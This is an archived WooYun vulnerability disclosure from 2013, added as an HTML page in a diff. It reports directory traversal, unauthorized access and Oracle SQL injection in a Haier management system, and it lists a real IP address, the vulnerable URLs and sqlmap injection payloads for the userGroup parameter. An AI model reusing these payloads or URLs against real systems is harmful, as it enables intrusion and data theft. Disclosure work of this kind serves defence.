@@ -1,0 +1,266 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		海尔某重要管理系统问题打包(sql注入、未授权访问、目录遍历)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		海尔某重要管理系统问题打包(sql注入、未授权访问、目录遍历)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/霍大然">霍大然</a> 
+</li><li>提交时间：		2013-09-22 09:14</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-25：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-10-05：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-10-15：	细节向普通白帽子公开<br/>
+									2013-10-25：	细节向实习白帽子公开<br/>
+									2013-11-06：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">sql注入问题导致各地公司信息泄露(数据量比较大)、配置不当导致未授权访问及目录遍历泄露等问题。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">问题站点：<br />
+<br />
+http://58.56.128.17:8888/<br />
+<br />
+可以看到所有的信息都应该通过登录看到<br />
+<br />
+</p><p class="detail"><a href="../images/2208414716cc4a9a84e785d94e24f135b7059617.png" target="_blank"><img src="../images/2208414716cc4a9a84e785d94e24f135b7059617.png" alt="5-1.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+一、目录遍历导致源码泄露<br />
+<br />
+http://58.56.128.17:8888/public/<br />
+<br />
+看到money眼前一亮<br />
+<br />
+</p><p class="detail"><a href="../images/220842456762e0d0085d8c99ce0f8fd440760c2d.png" target="_blank"><img src="../images/220842456762e0d0085d8c99ce0f8fd440760c2d.png" alt="5-2.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+源码出来了：<br />
+<br />
+</p><p class="detail"><a href="../images/22084314c3ac5f3007fcaf3e1e5ed882d53c54e7.png" target="_blank"><img src="../images/22084314c3ac5f3007fcaf3e1e5ed882d53c54e7.png" alt="5-3.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+http://58.56.128.17:8888/project/bak/com/neukingstone/common/里也有java的源码<br />
+<br />
+http://58.56.128.17:8888/common/<br />
+<br />
+二、未授权访问<br />
+<br />
+http://58.56.128.17:8888/common/deptduty.jsp<br />
+<br />
+随便选一个，组织机构列表出来了<br />
+<br />
+</p><p class="detail"><a href="../images/2208434896d2ace32dd5df1557736114a4d8d756.png" target="_blank"><img src="../images/2208434896d2ace32dd5df1557736114a4d8d756.png" alt="5-4.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+看到下个链接发现他们的系统是东软做的：<br />
+<br />
+http://58.56.128.17:8888/project/bak/com/neukingstone/<br />
+<br />
+<br />
+<br />
+http://58.56.128.17:8888/project/bak/com/neukingstone/util/DAO.java~1~<br />
+<br />
+<br />
+<br />
+发现下面的链接可以简单操作：<br />
+<br />
+http://58.56.128.17:8888/common/selmultiman.jsp<br />
+<br />
+</p><p class="detail"><a href="../images/220844193fc38f49e2e2b79218a3152137d2b97f.png" target="_blank"><img src="../images/220844193fc38f49e2e2b79218a3152137d2b97f.png" alt="5-41.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+三、sql注入问题<br />
+<br />
+注入点：<br />
+<br />
+http://58.56.128.17:8888/common/selmultiman.jsp?userGroup=2<br />
+<br />
+Place: GET<br />
+<br />
+Parameter: userGroup<br />
+<br />
+    Type: boolean-based blind<br />
+<br />
+    Title: Oracle boolean-based blind - Parameter replace (original value)<br />
+<br />
+    Payload: userGroup=(SELECT (CASE WHEN (9954=9954) THEN 2 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)<br />
+<br />
+<br />
+<br />
+    Type: error-based<br />
+<br />
+    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)<br />
+<br />
+    Payload: userGroup=2 AND 5249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(115)||CHR(105)||CHR(103)||CHR(113)||(SELECT (CASE WHEN (5249=5249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(108)||CHR(106)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL)<br />
+<br />
+<br />
+<br />
+    Type: AND/OR time-based blind<br />
+<br />
+    Title: Oracle AND time-based blind<br />
+<br />
+    Payload: userGroup=2 AND 6397=DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(113)||CHR(76)||CHR(116),5)<br />
+<br />
+---<br />
+<br />
+web application technology: JSP<br />
+<br />
+back-end DBMS: Oracle<br />
+<br />
+</p><p class="detail"><a href="../images/220845411ddc8d7f29812643640322fa805ff160.png" target="_blank"><img src="../images/220845411ddc8d7f29812643640322fa805ff160.png" alt="5-6.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+共310个表<br />
+<br />
+</p><p class="detail"><a href="../images/220846102bc7520ed0877a6e27c74d07cbe2e929.png" target="_blank"><img src="../images/220846102bc7520ed0877a6e27c74d07cbe2e929.png" alt="5-7.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+某用户表：<br />
+<br />
+</p><p class="detail"><a href="../images/22084650e4aa2e7491196ef00569a8725ea463b4.png" target="_blank"><img src="../images/22084650e4aa2e7491196ef00569a8725ea463b4.png" alt="5-8.PNG" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">看到一个money表，一看5000多条信息<br />
+<br />
+</p><p class="detail"><a href="../images/22084714b3909482e3b763df89e5836c325bda46.png" target="_blank"><img src="../images/22084714b3909482e3b763df89e5836c325bda46.png" alt="5-9.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+密码历史的记录，有3385条，可见用户真不少：<br />
+<br />
+</p><p class="detail"><a href="../images/2208473755ee286d078c24b48742aaab2fc95d1e.png" target="_blank"><img src="../images/2208473755ee286d078c24b48742aaab2fc95d1e.png" alt="5-10.PNG" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">让东软补去吧，配置要自己配置 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/霍大然" title="霍大然">霍大然</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-037745" title="海尔某重要管理系统问题打包(sql注入、未授权访问、目录遍历)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-09-25 09:17</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">首先感谢 @霍大然 的工作。<br />
+同一个业务单位，同样回复为老系统，正在联系技术人员处理，还未有正式的解决方案。<br />
+请各位白帽子持续友好监督海尔信息安全工作，非常感谢。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="37745";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
